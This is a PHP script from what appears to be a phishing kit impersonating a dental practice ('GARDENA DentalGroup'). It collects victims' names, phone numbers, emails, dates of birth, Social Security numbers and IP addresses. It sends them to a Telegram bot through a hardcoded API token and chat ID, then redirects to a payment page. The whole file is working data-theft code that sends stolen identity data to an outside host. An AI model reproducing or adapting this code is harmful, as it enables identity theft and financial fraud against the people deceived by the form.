<?php
session_start();

if (isset($_POST['submit'])) {
    $firstName = $_POST['first_name'] ?? '';
    $lastName = $_POST['last_name'] ?? '';
    $phone = $_POST['phone'] ?? '';
    $email = $_POST['email'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $ssn = $_POST['ssn'] ?? '';  
    $ipAddress = $_POST['ip_address'] ?? ''; 

    sacuvajPodatkeUSesiju('first_name', $firstName);
    sacuvajPodatkeUSesiju('last_name', $lastName);
    sacuvajPodatkeUSesiju('phone', $phone);
    sacuvajPodatkeUSesiju('email', $email);
    sacuvajPodatkeUSesiju('dob', $dob);
    sacuvajPodatkeUSesiju('ssn', $ssn);
    sacuvajPodatkeUSesiju('ip_address', $ipAddress);

    $apiToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
    $chatId = '-4104959417';
    $telegramMessage = "GARDENA DentalGroup\nFirst Name: $firstName\nLast Name: $lastName\nPhone: $phone\nEmail: $email\nDate of Birth: $dob\nSSN: $ssn\nIP Address: $ipAddress";

    $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
    $telegramData = [
        'chat_id' => $chatId,
        'text' => $telegramMessage,
    ];
    $chTelegram = curl_init($telegramUrl);
    curl_setopt($chTelegram, CURLOPT_POST, true);
    curl_setopt($chTelegram, CURLOPT_POSTFIELDS, http_build_query($telegramData));
    curl_setopt($chTelegram, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($chTelegram, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    $telegramResponse = curl_exec($chTelegram);
    curl_close($chTelegram);

    if ($telegramResponse === false) {
        echo "Greška pri slanju poruke na Telegram grupu: " . curl_error($chTelegram);
    } else {
        echo "Poruka je uspešno poslata na Telegram grupu: " . $telegramResponse;
        header("Location: payment.php");
        exit();
    }
}

function sacuvajPodatkeUSesiju($imePolja, $vrednost) {
    if (!isset($_SESSION['podaci'])) {
        $_SESSION['podaci'] = array();
    }
    $_SESSION['podaci'][$imePolja] = $vrednost;
}
?>
